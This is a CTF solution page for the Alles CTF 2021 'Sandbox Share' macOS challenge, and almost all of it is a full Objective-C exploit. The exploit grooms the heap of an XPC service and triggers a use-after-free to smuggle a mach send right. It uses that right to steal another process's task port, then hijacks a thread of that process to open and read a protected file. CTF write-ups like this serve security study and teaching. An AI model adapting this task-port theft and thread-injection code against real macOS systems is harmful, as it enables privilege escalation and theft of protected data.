? Sandbox Share  
================

Solution  
--------

The detailed complete solution can be found on [Synacktiv
blog](https://www.synacktiv.com/publications/macos-xpc-exploitation-sandbox-
share-case-study.html).

Exploit code  
------------

The code is not really clean but hey, it's a CTF solution :)

```objc  
#import <Cocoa/Cocoa.h>  
#include <stdio.h>  
#include <string.h>  
#include <stdlib.h>  
#include <errno.h>  
#include <sys/mman.h>  
#include <xpc/xpc.h>  
#include <mach/mach.h>  
#include <mach/mach_vm.h>  
#include <dlfcn.h>

#define EBFE ((uint8_t[]){0xeb, 0xfe})

#define NB_ENTRIES 200  
#define OBJECT_STRING_SIZE 0x220  
#define STRING_OBJECT_SIZE 48  
#define DATA_PREFIX_SIZE 0x40

#define CHECK(op) \  
   do { \  
       kern_return_t __kern_return_value = op; \  
       if(__kern_return_value != KERN_SUCCESS) { \  
           printf("[-] operation \"%s\" (line %d) FAILED (%d)\n", #op, __LINE__, __kern_return_value); \  
           return 1; \  
       } \  
   } while (0)

#define FIND_GADGET(gadget) \  
   uint64_t addr_##gadget = (uint64_t)memmem(shared_cache_base,
shared_cache_size, gadget, sizeof(gadget)); \  
   if (addr_##gadget == 0) { \  
       printf("[-] unable to find %s\n", #gadget); \  
       return 1; \  
   } \  
   printf("[+] gadget %s: %llX\n", #gadget, addr_##gadget);

extern char **environ;

// ------------------ imports ------------------  
// These XPC functions are private for some reason...  
// But Linus helped us out ;)

// write mach ports into xpc dictionaries  
extern void xpc_dictionary_set_mach_send(xpc_object_t dictionary,  
                                       const char* name,  
                                       mach_port_t port);

// get mach ports from xpc objects  
extern mach_port_t xpc_mach_send_get_right(xpc_object_t value);

extern xpc_object_t xpc_mach_send_create(mach_port_t);  
extern size_t malloc_size(void *);

// ------------------ globals ------------------  
// #define XPC_SERVICE_NAME    "com.alles.sandbox_share"

xpc_connection_t connection;  
char *client_id = NULL;

// ------------------ code ------------------  
int register_client(task_port_t task_port) {  
   xpc_object_t message, reply;

   message = xpc_dictionary_create(NULL, NULL, 0);  
   xpc_dictionary_set_uint64(message, "op", 1);  
   xpc_dictionary_set_mach_send(message, "task", task_port);  
  
   reply = xpc_connection_send_message_with_reply_sync(connection, message);

   if(xpc_dictionary_get_int64(reply, "status")) {  
       const char *error = xpc_dictionary_get_string(reply, "error");  
       printf("[-] Error register_client: %s\n", error);  
       return -1;  
   }

   const char *result = xpc_dictionary_get_string(reply, "client_id");  
  
   client_id = calloc(1, 9);  
   strncpy(client_id, result, 9);

   return 0;  
}

uint64_t create_entry(xpc_object_t object, uint64_t token_index, char *UIDs) {  
   xpc_object_t message, reply;

   message = xpc_dictionary_create(NULL, NULL, 0);  
   xpc_dictionary_set_uint64(message, "op", 2);  
   xpc_dictionary_set_string(message, "client_id", client_id);  
   xpc_dictionary_set_value(message, "data", object);  
   xpc_dictionary_set_string(message, "UIDs", UIDs);  
   xpc_dictionary_set_uint64(message, "token_index", token_index);  
  
   reply = xpc_connection_send_message_with_reply_sync(connection, message);  
   // printf("create_entry reply: \n%s\n", xpc_copy_description(reply));

   if(xpc_dictionary_get_int64(reply, "status") != 0) {  
       const char *error = xpc_dictionary_get_string(reply, "error");  
       printf("[-] Error create_entry: %s\n", error);  
       return -1;  
   }

   return xpc_dictionary_get_uint64(reply, "index");  
}

xpc_object_t get_entry(uint64_t index) {  
   xpc_object_t message, reply;

   message = xpc_dictionary_create(NULL, NULL, 0);  
   xpc_dictionary_set_uint64(message, "op", 3);  
   xpc_dictionary_set_string(message, "client_id", client_id);  
   xpc_dictionary_set_uint64(message, "index", index);

   reply = xpc_connection_send_message_with_reply_sync(connection, message);  
   // printf("get_entry reply: \n%s\n", xpc_copy_description(reply));

   if(xpc_dictionary_get_int64(reply, "status") != 0) {  
       const char *error = xpc_dictionary_get_string(reply, "error");  
       printf("[-] Error get_entry: %s\n", error);  
       return (xpc_object_t)-1;  
   }

   return xpc_dictionary_get_value(reply, "data");  
}

int delete_entry(uint64_t index) {  
   xpc_object_t message, reply;

   message = xpc_dictionary_create(NULL, NULL, 0);  
   xpc_dictionary_set_uint64(message, "op", 4);  
   xpc_dictionary_set_string(message, "client_id", client_id);  
   xpc_dictionary_set_uint64(message, "index", index);

   reply = xpc_connection_send_message_with_reply_sync(connection, message);

   if(xpc_dictionary_get_int64(reply, "status") != 0) {  
       const char *error = xpc_dictionary_get_string(reply, "error");  
       printf("[-] Error delete_entry: %s\n", error);  
       return -1;  
   }

   return 0;  
}

uint64_t upload_data() {  
   mach_msg_type_number_t info_out_cnt = TASK_EVENTS_INFO_COUNT;  
   task_events_info_data_t task_events_info = {0};  
   kern_return_t kr = -1;  
   xpc_object_t data;

   kr = task_info(mach_task_self_, TASK_EVENTS_INFO,
(task_info_t)&task_events_info, &info_out_cnt);  
   if(kr != KERN_SUCCESS) {  
       printf("[-] Failed to get task info! \nError (%d): %s\n", kr, mach_error_string(kr));  
       return (uint64_t)-1;  
   }  
   data = xpc_data_create(&task_events_info, sizeof(task_events_info_data_t));  
  
   return create_entry(data, 1, "0");  
}

struct dyld_cache_header  
{  
   char        magic[16];              // e.g. "dyld_v0     ppc"  
   uint32_t    mappingOffset;          // file offset to first
dyld_cache_mapping_info  
   uint32_t    mappingCount;           // number of dyld_cache_mapping_info
entries  
   uint32_t    imagesOffset;           // file offset to first
dyld_cache_image_info  
   uint32_t    imagesCount;            // number of dyld_cache_image_info
entries  
   uint64_t    dyldBaseAddress;        // base address of dyld when cache was
built  
   uint64_t    codeSignatureOffset;    // file offset of code signature blob  
   uint64_t    codeSignatureSize;      // size of code signature blob (zero
means to end of file)  
   uint64_t    slideInfoOffset;        // file offset of kernel slid info  
   uint64_t    slideInfoSize;          // size of kernel slid info  
};

struct dyld_cache_mapping_info {  
   uint64_t    address;  
   uint64_t    size;  
   uint64_t    fileOffset;  
   uint32_t    maxProt;  
   uint32_t    initProt;  
};

void *find_shared_cache_code_base(uint64_t *mapping_size) {  
   mach_vm_address_t address = 0;

   while (1) {  
       mach_vm_size_t size = 0;  
       vm_region_submap_info_data_64_t info;  
       uint32_t depth = 0;  
       mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;  
       kern_return_t ret = mach_vm_region_recurse(mach_task_self(), &address, &size, &depth, (vm_region_recurse_info_t)&info, &count);  
       if (ret != KERN_SUCCESS)  
           break;  
       address += size;  
       if (! info.is_submap)  
           continue;  
       count = VM_REGION_SUBMAP_INFO_COUNT_64;  
       mach_vm_size_t sub_size = 0;  
       mach_vm_address_t sub_address = address - size;  
       depth = 1;  
       ret = mach_vm_region_recurse(mach_task_self(), &sub_address, &sub_size, &depth, (vm_region_recurse_info_t)&info, &count);  
       if (ret != KERN_SUCCESS)  
           break;

       if (memcmp((void *)sub_address, "dyld_v1", 7) != 0)  
           continue;  
       struct dyld_cache_header *cache = (void *)sub_address;  
       struct dyld_cache_mapping_info *mapping_info = (void *)(sub_address + cache->mappingOffset);  
       *mapping_size = mapping_info->size;  
       return (void *)sub_address;  
   }  
   return NULL;  
}

int main (int argc, const char * argv[]) {  
   uint64_t index;

   const char *service_name = argv[1];  
   printf("[i] Using service: %s\n", service_name);

   connection = xpc_connection_create_mach_service(service_name, NULL, 0);  
   if (connection == NULL) {  
       printf("[-] ERROR: cannot create connection\n");  
       exit(1);  
   }

   printf("[+] Connected to: %s\n", service_name);

   xpc_connection_set_event_handler(connection, ^(xpc_object_t response) {  
       xpc_type_t t = xpc_get_type(response);  
       if (t == XPC_TYPE_ERROR){  
           printf("[-] ERROR: %s\n", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));  
           exit(-1);  
       }  
   });  
   xpc_connection_resume(connection);  
   puts("[+] Event handler registered!");

   if (argc == 2) {  
       register_client(mach_task_self_);  
       printf("[+] Got client_id: %s\n", client_id);

       // first let's clean the heap by creating a LOT of tiny allocations  
       xpc_object_t data = xpc_dictionary_create(NULL, NULL, 0);  
       for (uint32_t i = 0; i < 100000; i++)  
           xpc_connection_send_message(connection, data);

       // now the heap should be "clean"...  
       // let's create our UAF object  
       // we will use a string as the container is alloc BEFORE the object  
       uint64_t entry_id = 0;

       char object_string[OBJECT_STRING_SIZE];  
       memset(object_string, 'C', OBJECT_STRING_SIZE);  
       object_string[OBJECT_STRING_SIZE - 1] = 0;

       // create few entries to empty the caches..

       for (uint32_t i = 0; i < 100; i++)  
           create_entry(xpc_string_create(object_string), 7, "0");

       // create the victim entry  
       char uid_str[20];  
       snprintf(uid_str, sizeof(uid_str), "%d", getuid());  
       entry_id = create_entry(xpc_string_create(object_string), 1, uid_str);  
       printf("[+] Got entry: %lld\n", entry_id);  
       char entry_str[20];  
       snprintf(entry_str, sizeof(entry_str), "%lld", entry_id);

       // alloc some data after to close the holes...  
       for (uint32_t i = 0; i < 10; i++) {  
           xpc_connection_send_message(connection, data);  
       }

       const char *new_argv[] = {argv[0], argv[1], client_id, entry_str, NULL};  
       execve(new_argv[0], (char *const *)new_argv, environ);  
       return 0;  
   } else {  
       uint64_t entry_id = (uint64_t)atoll(argv[3]);  
       client_id = (char *)argv[2];  
       printf("[+] In execve'd process\n");  
       printf("[+] Got client_id: %s\n", client_id);  
       printf("[+] Got entry %llu\n", entry_id);

       // register a new client...  
       register_client(mach_task_self_);  
       const char *new_client_id = client_id;

       // create and free a few entries to make some room for our future allocations  
       uint64_t entries[NB_ENTRIES];  
       for (uint32_t i = 0; i < NB_ENTRIES; i++)  
           entries[i] = create_entry(xpc_data_create("DATA", 4), 1, "0");

       for (uint32_t i = 0; i < NB_ENTRIES; i++)  
           delete_entry(entries[i]);

       // trigger the first free  
       client_id = (char *)argv[2];  
       delete_entry(entry_id);

       // try to reuse with data...  
       client_id = (char *)new_client_id;  
       uint8_t reuse_data[(STRING_OBJECT_SIZE+OBJECT_STRING_SIZE-DATA_PREFIX_SIZE)];  
       memset(reuse_data, 'C', sizeof(reuse_data));  
       xpc_object_t send_right = xpc_mach_send_create(mach_task_self());  
       memcpy(&reuse_data[OBJECT_STRING_SIZE-DATA_PREFIX_SIZE], send_right, malloc_size(send_right));

       if (malloc_size(send_right) > STRING_OBJECT_SIZE) {  
           printf("[-] send right too big!");  
           return 1;  
       }

       memcpy(&reuse_data[OBJECT_STRING_SIZE-DATA_PREFIX_SIZE], send_right, malloc_size(send_right));

       for (uint32_t i = 0 ; i < NB_ENTRIES; i++)  
           entries[i] = create_entry(xpc_data_create(reuse_data, sizeof(reuse_data)), 7, "0");

       // trigger the second free  
       // client_id = (char *)argv[2];  
       // exploit(entry_id);

       client_id = (char *)new_client_id;  
       xpc_object_t uaf_object = get_entry(entry_id);  
       if (uaf_object == (xpc_object_t)-1) {  
           printf("[-] get_entry FAILED\n");  
           return 1;  
       }  
       const char *desc = xpc_copy_description(uaf_object);  
       printf("[+] reused entry: %s\n", desc);

       mach_port_t server_port = xpc_mach_send_get_right(uaf_object);  
       mach_port_name_array_t names;  
       mach_port_type_array_t types;  
       mach_msg_type_number_t count;

       CHECK(mach_port_names(server_port, &names, &count, &types, &count));  
       mach_port_t victim_port = MACH_PORT_NULL;  
       for (uint32_t i = 0; i < count; i++) {  
           if ((types[i] == MACH_PORT_TYPE_SEND) && (names[i] != mach_task_self())) {  
               mach_port_t port;  
               mach_msg_type_name_t right_type;  
               CHECK(mach_port_extract_right(server_port, names[i], MACH_MSG_TYPE_COPY_SEND, &port, &right_type));

               natural_t port_type;  
               mach_vm_address_t object_addr;  
               CHECK(mach_port_kobject(mach_task_self(), port, &port_type, &object_addr));  
               if (port_type == 2) {  
                   pid_t pid;  
                   CHECK(pid_for_task(port, &pid));  
                   if (pid != getpid()) {  
                       if (victim_port != MACH_PORT_NULL)  
                           printf("[-] Found more than one victim oO\n");  
                       victim_port = port;  
                       printf("[+] Found a victim: %d\n", pid);  
                   }  
               }

           }  
       }

       if (victim_port == MACH_PORT_NULL) {  
           printf("[-] unable to find victim :/\n");  
           return 1;  
       }

       thread_act_array_t threads;  
       uint nb_threads;  
       CHECK(task_threads(victim_port, &threads, &nb_threads));

       uint64_t shared_cache_size;  
       void *shared_cache_base = find_shared_cache_code_base(&shared_cache_size);  
       FIND_GADGET(EBFE);

       mach_port_t thread = threads[0];  
       x86_thread_state64_t state;  
       mach_msg_type_number_t stateCnt = x86_THREAD_STATE64_COUNT;

       CHECK(thread_suspend(thread));  
       CHECK(thread_abort(thread));

       CHECK(thread_get_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, &stateCnt));

       state.__rsp = (state.__rsp & ~0xFFFull) - 0x8; // keep the stack aligned...  
       CHECK(mach_vm_write(victim_port, (vm_address_t)state.__rsp, (vm_address_t)&addr_EBFE, sizeof(addr_EBFE)));

       CHECK(mach_vm_write(victim_port, (vm_address_t)state.__rsp + 8, (vm_address_t)"/etc/flag", 10));  
       //  RDI, RSI, RDX, RCX, R8, R9  
       state.__rdi = state.__rsp + 8;  
       state.__rsi = O_RDONLY;  
       state.__rip = (uint64_t)dlsym(RTLD_DEFAULT, "open");  
       CHECK(thread_set_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, x86_THREAD_STATE64_COUNT));  
       CHECK(thread_resume(thread));  
       do {  
           usleep(1000);  
           CHECK(thread_suspend(thread));  
           CHECK(thread_get_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, &stateCnt));  
           if (state.__rip == addr_EBFE)  
               break;  
       } while (1);  
       state.__rsp -= 8;

       printf("[+] fd: %llX\n", state.__rax);  
       state.__rdi = state.__rax;  
       state.__rsi = state.__rsp + 8;  
       state.__rdx = 1024;  
       state.__rip = (uint64_t)dlsym(RTLD_DEFAULT, "read");  
       CHECK(thread_set_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, x86_THREAD_STATE64_COUNT));  
       CHECK(thread_resume(thread));  
       do {  
           usleep(1000);  
           CHECK(thread_suspend(thread));  
           CHECK(thread_get_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, &stateCnt));  
           if (state.__rip == addr_EBFE)  
               break;  
       } while (1);  
       state.__rsp -= 8;

       size_t flag_len = state.__rax;  
       char flag[flag_len + 1];

       mach_vm_size_t read_size;  
       CHECK(mach_vm_read_overwrite(victim_port, (vm_address_t)state.__rsp + 8, flag_len, (mach_vm_address_t)&flag, &read_size));

       if (flag[flag_len-1] == '\n')  
           flag[flag_len-1] = 0;  
       else  
           flag[flag_len] = 0;

       printf("[+] flag: \"%s\"\n", flag);  
   }

   xpc_release(connection);  
   return 0;  
}  
```  

Original writeup (https://github.com/synacktiv/CTF-Write-ups/blob/main/Alles-
CTF-2021/pwn/sandbox_share.md).